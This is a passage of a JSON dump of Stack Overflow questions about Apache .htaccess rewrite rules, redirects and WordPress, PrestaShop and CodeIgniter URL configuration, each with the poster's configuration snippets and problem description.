but have failed to get anything to work yet.</p>\n\n<p>Is there a right way to do this? Are there alternative ways to acheive this?</p>\n\n<p>I can address the file directly, using <code>https://somehwhere.com/BalanceManager.php</code> and that works, but when I look up <code>https://184.22.345.77/BalanceManager.php</code> in my browser, it throws a 404.</p>\n\n<p>The host is within the Amazon Web Services architecture, and importantly... <strong>I am using a load balanced Wordpress site.</strong></p>\n\n<p>Cheers!</p>\n"},{"tags":["wordpress",".htaccess","wildcard"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12734514,"title":"Wordpress MU: www. to the http://","body":"<p>In my .htaccess what would I have to put in it to basically create a wildcard so if anyone accesses <code>www.*.domain.co.nz</code> it will redirect to <code>http://*.domain.co.nz</code>.</p>\n\n<p>I can get it working for one domain but then I clicked what about the others.</p>\n\n<p>At this stage I have an <code>index.html</code> being a hold page but I would also like to be able to access wordpress's <code>index.php</code></p>\n\n<p>I am using the standard MU <code>.htaccess</code></p>\n\n<pre><code>RewriteEngine On\nOptions +FollowSymlinks\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\n\n# uploaded files\nRewriteRule ^files/(.+) wp-includes/ms-files.php?file=$1 [L]\n\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^ - [L]\nRewriteRule . index.php [L]\n</code></pre>\n"},{"tags":["wordpress",".htaccess","http-status-code-500"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12522128,"title":"500 Internal Server Error on Wordpress","body":"<p>I'm at my wits end over 500 internal server errors on Wordpress.  I'm with 123reg who seem to be well known for poor customer support, so I've been trying to resolve myself.</p>\n\n<p>Bit of background - Wordpress installed on /wp/ subdirectory as 123reg don't allow auto install on root.  500 error when saving posts and just browsing site on occassion.  >10 times in one week.</p>\n\n<p>Getting the following error messages;</p>\n\n<pre><code>2012-09-20T13:11:55+01:00 linweb9 httpd[13273]: [error] [client 95.151.187.161] Premature end of script headers: post.php, referer: http://www.asprayni.com/wp/wp-admin/post.php?post=6769&amp;action=edit\n2012-09-20T13:15:15+01:00 linweb9 httpd[14309]: [error] [client 95.151.187.161] Premature end of script headers: post.php, referer: http://www.asprayni.com/wp/wp-admin/post.php?post=6769&amp;action=edit\n2012-09-20T13:20:16+01:00 linweb9 httpd[15261]: [error] [client 95.151.187.161] Premature end of script headers: admin-ajax.php, referer: http://www.asprayni.com/wp/wp-admin/post.php?post=6769&amp;action=edit\n</code></pre>\n\n<p>I'd appreciate if anyone can give any insight or advice.  My .htaccess looks like this;</p>\n\n<pre><code>RewriteEngine On\n\nRewriteCond %{HTTP_HOST} ^****.com$ [NC,OR]\nRewriteCond %{HTTP_HOST} ^www.****.com$ [NC]\nRewriteCond %{REQUEST_URI} !^/wp/\nRewriteRule ^(.*)$ /wp/ [L]\n</code></pre>\n\n<p>Thanks in advance to anyone that can help!  Also, I can't define more than 64mb on php ini as I think that's the limit for 123reg shared hosted sites.</p>\n\n<p>Phil</p>\n"},{"tags":["php","apache",".htaccess","google-index"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12315871,"title":"google is indexing Apache Test page","body":"<p>Let's say I have a website, <code>example.com</code>. But the contents for this website is on another domain, say <code>test.com/test</code> and redirections are happening using <code>htaccess</code> files. </p>\n\n<p>I have set up <code>301 redirection</code> for redirecting from <code>test.com/test</code> to <code>example.com</code>. The issue is when I search for <code>example.com</code>, I am getting an Apache Test page, and when I queried like site: <code>example.com</code> for getting the Google crawled page, I am getting a <code>403 Forbidden</code> error. </p>\n\n<p>How can I fix this problem? The site is working fine. This site is also indexing correctly in other search engines (namely Yahoo and Bing).</p>\n"},{"tags":["wordpress","apache",".htaccess","permalinks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12734047,"title":"/wp-admin/ working but no other permalinks are working due to .htaccess setup confusion","body":"<p>I need to redirect the homepage to index.html and /business to /business/index.html so I've modified the rewrite rules written in by WordPress by default:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.html$ - [L]\nRewriteRule ^business/ - [L]\nRewriteRule ^index\\.php$ - [L]\nRewriteRule ^$ /index.html [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>If I remove my rules permalinks work again but I really need these rules in... /wp-admin still works just fine.</p>\n\n<p>Anyone have any ideas?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":12727379,"title":"htaccess does not work rewrite rule","body":"<p>I've been struggling with my <code>.htaccess</code> file for weeks now, I changed it many times but it just won't work.</p>\n\n<p>I have this in my <code>.htaccess</code> file:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} -f [OR]\nRewriteCond %{REQUEST_FILENAME} -d\nRewriteRule ^/([^./]+)\\.html$ category.php?id=$1 \nRewriteRule ^/([^./]+)\\.html$ tag.php?id=$1 \nRewriteRule ^/([^./]+)\\.html$ play.php?id=$1 \n</code></pre>\n\n<p>but it does not work.</p>\n"},{"tags":[".htaccess","url","url-rewriting","seo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":76,"score":0,"question_id":12733883,"title":"Using mod_rewrite to Convert Dynamic URLs to SEO Friendly URLs ??","body":"<p>I am not a PHP developer  and I have been asked to perform some SEO .\nHere Is My .htaccess</p>\n\n<pre><code>    RewriteEngine On\n    RewriteBase /\n    RewriteRule [_\\ ] space.cgi [L]\n    ErrorDocument 404 /errors/404.php \n    ErrorDocument 400 /errors/badrequest.php\n    ErrorDocument 401 /errors/authreqd.php\n    ErrorDocument 403 /errors/forbid.php\n    ErrorDocument 500 /errors/serverr.php \n    ErrorDocument 503 /errors/ServiceUnavailable.php \n\n    RewriteEngine On \n    RewriteCond %{HTTP_USER_AGENT} ^BlackWidow [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Bot\\ mailto:craftbot@yahoo.com [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^ChinaClaw [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Custo [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^DISCo [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^GetWeb! [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Go!Zilla [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Go-Ahead-Got-It [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^GrabNet [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Grafula [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^HMView [OR] \n    RewriteCond %{HTTP_USER_AGENT} HTTrack [NC,OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Image\\ Stripper [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Image\\ Sucker [OR] \n    RewriteCond %{HTTP_USER_AGENT} Indy\\ Library [NC,OR] \n    RewriteCond %{HTTP_USER_AGENT} ^InterGET [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Internet\\ Ninja [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^JetCar [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^JOC\\ Web\\ Spider [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^larbin [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^LeechFTP [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Website\\ Quester [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^WebStripper [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^WebWhacker [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^WebZIP [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Wget [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Widow [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^WWWOFFLE [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Xaldon\\ WebSpider [OR] \n    RewriteCond %{HTTP_USER_AGENT} ^Zeus \n    RewriteRule ^.* - [F,L]\n    RewriteRule rss.xml rss.php [QSA,L]\n\n    RewriteEngine on\n    RewriteRule ^index.htm$ index.php\n    RewriteRule ^search.htm$ search.php\n    RewriteRule ^about.htm$ about.php\n    RewriteRule ^contacts.htm$ contacts.php\n    RewriteRule ^gallery.htm$ gallery.php\n    RewriteRule readmore.htm$ readmore.php\n\n    RewriteEngine on\n\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME}\\.php -f\n    RewriteRule .* $0.php\n\n    RewriteEngine on\n\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteCond %{REQUEST_FILENAME}\\.htm -f\n    RewriteRule .* $0.htm\n</code></pre>\n\n<p>I'm trying to rewrite my URLs to be more SEO friendly, and I'm doing this in my .htaccess file using the following code:</p>\n\n<pre><code>RewriteEngine On      \nRewriteRule blog/(.*)/$ readmore.php?&amp;postid=$1 [NC]      \nRewriteRule ^/*(.+/)?([^.]*[^/])$ http://%{HTTP_HOST}/$1$2/ [L,R=301]\n</code></pre>\n\n<p>Last Code not working With my site :S i don't Know !! Help Please \n<a href=\"http://www.afrogfx.com/index\" rel=\"nofollow\">http://www.afrogfx.com/index</a></p>\n\n<p>URL  to Convert </p>\n\n<pre><code> http://www.afrogfx.com/readmore?postid=62&amp;categories=6&amp;catid=6#.UG3ZoK5adS8\n</code></pre>\n\n<p>OR</p>\n\n<p><a href=\"http://www.afrogfx.com/readmore?postid=62\" rel=\"nofollow\">http://www.afrogfx.com/readmore?postid=62</a></p>\n"},{"tags":[".htaccess","redirect","ip-address","ip-restrictions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":260,"score":-1,"question_id":9263896,"title":"Restrict / Block Directory Based on IP Address","body":"<p>Trying to block directory access from everyone except 1 IP address.  This .htaccess code blocks access but it blocks access to everything including images, css, etc.  What do I need to change?  </p>\n\n<p><code>RewriteCond %{REMOTE_ADDR} !^XX\\.XXX\\.XX\\.XXX$<br>\nRewriteRule ^hidedirectory(.*)$ http://site.com/ [R,L]</code></p>\n\n<p>Anyone accessing mysite.com/hidedirectory except me should redirect to mysite.com.  Is there a better, more secure way to do this including something like an http response code?</p>\n"},{"tags":["php",".htaccess","codeigniter","session","cookies"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12730910,"title":".htaccess causing session/cookie issues in chrome","body":"<p>Ok guy's i've had a problem that I've been obsessing over for days and still can't find a solution. basically what is happening is.. I'm using the CodeIgniter framework and when I use .htaccess to remove the index.php from the bootstrap, Only in chrome does the session not set. It works fine everywhere else. If I do it without the .htaccess, just using say mysite.com/index.php/controller it works fine.</p>\n\n<p>I'm so stumped and tried so many different solutions/fixes etc. and nothing. I can't find anyone else at all with this issue. Any help would be greatly appreciated!</p>\n"},{"tags":["php",".htaccess","mod-rewrite","redirect","hide"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":203,"score":2,"question_id":12731378,"title":"hide parameter (query string) in url (htaccess) but send this parameter to a page (php)","body":"<p>How to hide parameters (query_string) in url but send them to page hidden, not visible in address bar\n<br>\nexample:<br>\nI have this:<br></p>\n\n<pre><code>http://localhost/index.php?sent=true\n</code></pre>\n\n<p>i want:</p>\n\n<pre><code>http://localhost/index.php\n</code></pre>\n\n<p>but i want to get sent parameter in PHP $_GET['sent']</p>\n\n<p>i tried to redirect to page with no parameters(no query_string) [R] and after that give page some parameters (silently) without [R] redirection (without changing adress itself)</p>\n\n<p>i tried to use RewriteRule in htaccess with different flags and different ways but nothing worked</p>\n\n<p>i learned that if i want to change address in browser, i must use R flag with L flag in one RewriteRule line - other way it does not work - adress does not change</p>\n\n<p>but when i use [L] flag i cannot go to next line(next RewriteRule) and append any query_string to address without [R] redirection</p>\n\n<p>if i don't put an [L] flag in first line (with [R]) i don't have new address but if i do - i can't use [C] flag or even [N] flag</p>\n\n<hr>\n\n<p>Here is why:</p>\n\n<p>on my page i use header('Location: ...?sent=true') function after successful data sent from Form\ni redirect to ?sent=true because of i don't want to user refresh page and send the same data again</p>\n\n<p>but after redirect to ?sent=true i don't want to have that query_string in address bar\nthere are more forms on that page that will send other POST data and refresh page with this ugly query_string there</p>\n\n<p>how to do that?</p>\n"},{"tags":["apache",".htaccess","prestashop"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":153,"score":0,"question_id":12571346,"title":"Where should be placed htaccess file in Prestashop 1.4x?","body":"<p>my Prestashop 1.4x installed in a subdirectory, eg: <a href=\"http://mydomain.com/prestashop/\" rel=\"nofollow\">http://mydomain.com/prestashop/</a>\non Apache server.\nThere is option to generate Htaccess file from admins, which are copied into the /prestashop/ directory. Is it correct location or I should put htaccess into parent(root) directory?</p>\n\n<p>example:</p>\n\n<pre><code># .htaccess automaticaly generated by PrestaShop e-commerce open-source solution\n# WARNING: PLEASE DO NOT MODIFY THIS FILE MANUALLY. IF NECESSARY, ADD YOUR SPECIFIC CONFIGURATION WITH THE HTACCESS GENERATOR IN BACK OFFICE\n# http://www.prestashop.com - http://www.prestashop.com/forums\n\n\n&lt;IfModule mod_rewrite.c&gt;\n# URL rewriting module activation\nRewriteEngine on\n\n# URL rewriting rules\nRewriteRule ^([a-z]{2})/([0-9]+)\\-[a-zA-Z0-9-]*\\.html /store/product.php?id_product=$2&amp;isolang=$1 [QSA,L]\n... ... ...\n... ... ...\nRewriteRule ^en/best-sales$ /store/best-sales.php?isolang=en [QSA,L]\nRewriteRule ^en/page-not-found$ /store/404.php?isolang=en [QSA,L]\n&lt;/IfModule&gt;\n\n# Catch 404 errors\nErrorDocument 404 /store/404.php\n\n&lt;IfModule mod_expires.c&gt;\n    ExpiresActive On\n    ExpiresByType image/gif \"access plus 1 month\"\n    ExpiresByType image/jpeg \"access plus 1 month\"\n    ExpiresByType image/png \"access plus 1 month\"\n    ExpiresByType text/css \"access plus 1 week\"\n    ExpiresByType text/javascript \"access plus 1 week\"\n    ExpiresByType application/javascript \"access plus 1 week\"\n    ExpiresByType application/x-javascript \"access plus 1 week\"\n    ExpiresByType image/x-icon \"access plus 1 year\"\n&lt;/IfModule&gt;\n\nFileETag INode MTime Size\n&lt;IfModule mod_deflate.c&gt;\n    &lt;IfModule mod_filter.c&gt;\n        AddOutputFilterByType DEFLATE text/html text/css text/plain text/javascript application/javascript application/x-javascript\n    &lt;/IfModule&gt;\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12728194,"title":".htaccess and php rewrite","body":"<p>I can not do simple and does not understand what's the problem.\nI just want to create a nice looking URL.</p>\n\n<p>My link looks like this:\n<code>www.mysite.com/coach/23/victor</code></p>\n\n<p>My <code>.htaccess</code> file looks like this:</p>\n\n<pre><code>RewriteEngine On\nRewriteRule ^([^/]*)\\.html$ /index.php?p=$1 [L]\nRewriteRule ^([^/]*)/([^/]*)\\.html$ /index.php?p=$1&amp;id=$2 [L]\nRewriteRule ^([^/]*)/([^/]*)/([^/]*)\\.html$ /index.php?p=$1&amp;id=$2&amp;title=$3 [L]\n</code></pre>\n\n<p>in <code>functions.php</code> file I'm trying to get information like this:</p>\n\n<pre><code>$page_type=$_GET['p'];\n$page_type=$_GET['id'];\n$page_type=$_GET['title'];\n</code></pre>\n\n<p>In <code>index.php</code> I include <code>functions.php</code> and make a switch.</p>\n\n<pre><code>switch($page_type){\n  case \"home\": include \"home.php\";\n               break;\n}\n</code></pre>\n"},{"tags":[".htaccess","url","mod-rewrite","url-routing","seo-friendly"],"answer_count":1,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12291040,"title":"Need a Generic way to Create SEO friendly URL","body":"<p>i have searched a lot and implemented many many Regular Expression in my .htaccess file but can not succeeded  *<em>How to find Generic way that make my url SEO friendly *</em> </p>\n\n<p>currently this is in my .htaccess file</p>\n\n<pre><code>   RewriteEngine On\n   RewriteCond %{REQUEST_FILENAME} !-f\n   RewriteCond %{REQUEST_FILENAME} !-d\n   RewriteRule ^(.*)$ index.php?page=$1 [L,QSA]\n</code></pre>\n\n<p>What i need to do is that i have a URL like this</p>\n\n<pre><code>   http://localhost/abc/index.php?page=boats_for_sale\n</code></pre>\n\n<p>i need to change it to</p>\n\n<pre><code>  http://localhost/abc/boats_for_sale\n</code></pre>\n\n<p>similarly i want to hide all querry string in my url \nhow would i achieve it ??</p>\n"},{"tags":[".htaccess","joomla","url-rewriting","rss","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":12727163,"title":"Redirect joomla 1.5 RSS feeds to new onw via htaccess","body":"<p>I would like to redirect old joomla 1.5 RSS Feeds to new ones via htaccess. For example I have an old URL: <a href=\"http://www.mydomain.tld/en/categories/debian.feed?type=atom\" rel=\"nofollow\">http://www.mydomain.tld/en/categories/debian.feed?type=atom</a>\nand wish to redirect it to: <a href=\"http://www.mydomain.tld/en/?format=feed&amp;type=rss\" rel=\"nofollow\">http://www.mydomain.tld/en/?format=feed&amp;type=rss</a></p>\n\n<p>I tried it with the following htaccess rule, but it didn´t work:</p>\n\n<pre><code>RewriteRule ^de/categories/([a-z]+)\\.feed?type=atom$ http://www.mydomain.tld/en/?format=feed&amp;type=rss [R=301,L]\nRewriteRule ^en/categories/([a-z]+)\\.feed?type=atom$ http://www.mydomain.tld/en/?format=feed&amp;type=rss [R=301,L]\n</code></pre>\n\n<p>did anybody know whats wrong with my rule, or did have a working one for me?</p>\n"},{"tags":["apache",".htaccess","redirect","idn"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12723955,"title":".htaccess redirect umlaut domain","body":"<p>I am trying to redirect requests from a umlaut domain to another domain.</p>\n\n<p>My following code works with ANY other domain, but not umlaut:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteCond %{HTTPS} !=on\n  RewriteCond %{HTTP_HOST} ^(www\\.)?frankfurter-flöhe\\.de/$ [NC]\n  RewriteRule ^ http://kinderkultur-frankfurt.de/frankfurter-floehe-theaterprogramm.html [R=301,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>However, when I call the umlaut domain and copy it from google chromes address bar after that, I get this:</p>\n\n<p><a href=\"http://xn--frankfurter-flhe-zwb.de/\" rel=\"nofollow\">http://xn--frankfurter-flhe-zwb.de/</a></p>\n\n<p>Altough, if I use that obfruscated domain in my htaccess instead of the \"real\" umlaut domain, it doesn't work either.</p>\n\n<p>Does anybody have an idea how to match that domain?</p>\n"},{"tags":[".htaccess","url-rewriting","rewrite","seo-friendly","page-title"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":72,"score":-4,"question_id":12683315,"title":"How to make seo friendly url with htaccess url rewriting","body":"<p>I have a blog having this url structure <a href=\"http://www.presidenttowin.com/blog-detail.php?id=96\" rel=\"nofollow\">http://www.presidenttowin.com/blog-detail.php?id=96</a>\nI want to make it seo friendly.\nI want the blog title in the url.\nCan anybody tell me the htaccess code for it.</p>\n"},{"tags":["php",".htaccess","codeigniter","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12312519,"title":".htaccess issue to rewrite url for codeigniter","body":"<p>i am using codeigniter in my project.\ni have a url like <a href=\"https://www.domain.com/user/orderplace/any_number\" rel=\"nofollow\">https://www.domain.com/user/orderplace/any_number</a></p>\n\n<p>i was trying to use htaccess rewrite so that if anyone hits my site with https other than above url then redirect to http://</p>\n\n<p>i was trying</p>\n\n<pre><code>RewriteCond %{HTTPS} on\nRewriteCond %{REQUEST_URI} !^user/orderplace/(.*)$\nRewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L]\n</code></pre>\n\n<p>but its not working, i guess following line is not correct for my specified url\n    RewriteCond %{REQUEST_URI} !^user/orderplace/(.*)$</p>\n\n<p>can anyone help me in this issue?</p>\n"},{"tags":[".htaccess","url-rewriting","url-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12722037,"title":"htaccess codes behaves differently when written in single line and when written in two different lines","body":"<p>I was trying to learn the htaccess basics but initial step made me go crazy and lost some precious time..</p>\n\n<p>htaccess codes behaves differently when written in single line and when written in two different lines</p>\n\n<p>the code below </p>\n\n<pre><code>RewriteEngine on \nRewriteRule .* good.html   \n</code></pre>\n\n<p>And the code below </p>\n\n<pre><code>RewriteEngine on RewriteRule .* good.html   \n</code></pre>\n\n<p>Behave differently..</p>\n\n<p>Please explain how it goes..\nI guess, its because htaccess checks all the conditions first and then works.. \nbut that too should not make it work like that..</p>\n"},{"tags":["wordpress",".htaccess","plugins","url-rewriting","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12721074,"title":"wordpress how to remove ? from the url using htaccess","body":"<p>i having a URL <a href=\"http://www.domain.com/wp/application/?productname\" rel=\"nofollow\">http://www.domain.com/wp/application/?productname</a></p>\n\n<p>I want  to change it to <a href=\"http://www.domain.com/wp/application/productname\" rel=\"nofollow\">http://www.domain.com/wp/application/productname</a> . \nif i have treated like this then page not found error is display.\ni don't have use of product name in my application page , \n i want  to just show the name of product in URL for SEO.\nand page should be display the content of application page .</p>\n\n<p>wp is my root folder and application is my page</p>\n\n<p>Please Tell me Any solution htaccess or any plugin</p>\n\n<p>How to remove ? from the URL using Htacccess(Wordpress)</p>\n\n<p>I use following htaccess code. But it is not working for my condition .otherwise all  pages are working well </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /wp/\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /wp/index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":8578656,"title":"Is there a reason why I should not write a generalised .htaccess RewriteRule?","body":"<p>I have found some very useful code:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^www.example.com$ [NC]\nRewriteRule ^(.*)$ http://example.com/$1 [R=301,L]\n</code></pre>\n\n<p>from another Stack Overflow post:\n<a href=\"http://stackoverflow.com/questions/797257/remove-www-prefix-from-your-website\">Remove WWW prefix from your website</a>.</p>\n\n<p>I often re-use the same code on various sub-domains and sites so decided to rewrite a generalised version. I came up with the following:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^www\\.(.*) [NC]\nRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n</code></pre>\n\n<p>It appears to work, but can anyone give me a reason why I should not use this? Have I missed an obvious flaw?</p>\n\n<p>Edit: I am aware that removing the www has associated issues, but in this case I am more interested in problems arising from writing a generalised htaccess RewriteRule (rather than the actions of the rule itself)</p>\n\n<p>Edit: Code edited as recommended by @ulrich</p>\n"},{"tags":[".htaccess","mod-rewrite","cpanel","whm","webmail"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12720367,"title":"port forwarding using .htaccess","body":"<p>I want to forward the cpanel and webmail ports using .htaccess as follows:</p>\n\n<p>www.mydomain.com:2082 -> www.sharedserver.com:2083</p>\n\n<p>I tried the following but it doesn't seem to work:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^(www.mydomain.com):2082$ [NC,OR]\nRewriteCond %{HTTP_HOST} ^(www.mydomain.com):2083$ [NC]\nRewriteRule ^(.*)$ https://www.sharedserver.com:2083 [L,R=302]\n</code></pre>\n"}]}
{"total":14528,"page":12,"pagesize":100,"questions":[{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12720175,"title":"non-www to www .htaccess redirect not working?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/1100343/apache-redirect-from-non-www-to-www\">apache redirect from non www to www</a>  </p>\n</blockquote>\n\n\n\n<p>I want my domain to redirect the non-www to the www version. For some reason the below code isn't working.</p>\n\n<p>Any suggestions?</p>\n\n<p>Most probably any easy fix, but I can't get it to work.</p>\n\n<pre><code>&lt;ifmodule mod_deflate.c&gt;\n&lt;filesmatch \\.(css|html|js|php|xml)$&gt;\n    setoutputfilter deflate\n&lt;/filesmatch&gt;\n&lt;/ifmodule&gt;\n&lt;ifmodule mod_security.c&gt;\nsecfilterengine off\nsecfilterscanpost off\n&lt;/ifmodule&gt;\n\n&lt;ifmodule mod_rewrite.c&gt;\n    RewriteEngine on\nRewriteCond %{HTTP_HOST} ^trailerpulse.com/\nRewriteRule (.*) http://www.trailerpulse.com/$1 [R=301,L]\nRewriteCond %{request_filename} -f\nRewriteRule ^(.*) $1 [L]\nRewriteRule ^([a-z]+)(/([^/]{0,32})(/.+)?)?$  index.php?a=$1&amp;q=$3    [L]\n\n&lt;/ifmodule&gt;\n&lt;ifmodule mod_expires.c&gt;\nExpiresActive On\nExpiresDefault A0\n&lt;filesmatch \\.(css|js|gif|jpe?g|png)$&gt;\n    ExpiresDefault A604800\n&lt;/filesmatch&gt;\n&lt;filesmatch \\.(html|xml)$&gt;\n    ExpiresDefault A10800\n&lt;/filesmatch&gt;\n&lt;/ifmodule&gt;\n\nFileEtag None\nOptions All -Indexes\nServerSignature Off\nErrorDocument 404 /error\n</code></pre>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12720111,"title":"Apache mod_rewrite alias a path to another path","body":"<p>I have a weird rewriting problem due to some Drupal issue. I know not how to fix the Drupal issue, so this will be a temporary fix:</p>\n\n<p>The path <code>/the%20campanile/([0-9]+)/([0-9]+)/</code> (preferably with slash optional) should be an alias for <code>/campanile/([0-9]+)/([0-9]+)/</code>.</p>\n\n<p>I've tried:</p>\n\n<pre><code>RewriteBase /\nRewriteRule ^campy/([0-9]+)/([0-9]+)/$ campanile/$1/$2/\n</code></pre>\n\n<p>except that fails with 404 (presumably rewriting wrong). I've also tried with wildcards (<code>*</code>), but to no avail. I looked through about 16 posts on StackOverflow and a few other forums.</p>\n\n<p>The entire <code>.htaccess</code> looks like this:</p>\n\n<pre><code>RewriteEngine on\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php?q=$1 [QSA]\nRewriteRule ^campy/([0-9]+)/([0-9]+)/$ campanile/$1/$2/\nRewriteCond %{HTTP_HOST} ^danger-\\.palyvoice\\.com\nRewriteRule ^(.*)$ /category/blogs/danger-zone [L]\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":[".htaccess","mod-rewrite","clean-urls"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12703429,"title":".htaccess add a !not condition for group of rules","body":"<p>in order to accommodate some ajax I am working on a basic .htaccess rewrite.</p>\n\n<p>the folder structure</p>\n\n<pre><code>main.html\nalpha/\n      alpha.php\n      alpha.html\n</code></pre>\n\n<p>the main.html contains a div to call alpha/alpha.php \nthe alpha/alpha.html contains a static include for the alpha.php as well.</p>\n\n<p>I would like to have a clean url www.myUrl.com/alpha that calls alpha/alpha.html.</p>\n\n<p>How do I add a !NOT condition for a set of rules so I don't have to include it on each, such as removing <code>[^(html|php)]</code> from each rule in a group, ie </p>\n\n<pre><code>set the following condition\n^[^(html|php)]$\nfor\n\nRewriteRule ^(.*)_aaa$ %{DOCUMENT_ROOT}/$1/$1.html [L]\nRewriteRule ^(.*)_bbb$ %{DOCUMENT_ROOT}/$1/$1.html [L]\nRewriteRule ^(.*)_ccc$ %{DOCUMENT_ROOT}/$1/$1.html [L]\n\nend condition and do not apply for \nRewriteRule ^(.*)_ddd$ %{DOCUMENT_ROOT}/$1/$1.html [L] \nRewriteRule ^(.*)_eee$ %{DOCUMENT_ROOT}/$1/$1.html [L]`\n</code></pre>\n\n<p>current .htaccess</p>\n\n<pre><code>Options +ExecCGIn\nOptions -indexes\n\nDirectoryIndex main.html\n\nOptions +FollowSymLinks\nRewriteEngine on\nRewriteBase /\n\n# main start page\nRewriteRule ^main$ main.html [L] \n\n# clean for alpha\n# myUrl.com/alpha\nRewriteRule ^(.*)[^(html|php)]$ %{DOCUMENT_ROOT}/$1/$1.html [L] \n</code></pre>\n\n<p>thx Art</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12499500,"title":"htaccess mod_rewrite HTTP 500 error","body":"<p>This particular code works on one server, but not the other. The working one has Apache2, the other Apache1. What's the dealeo? How can I make it work on both?</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n  RewriteBase /\n\n  # SEO translation\n  RewriteCond 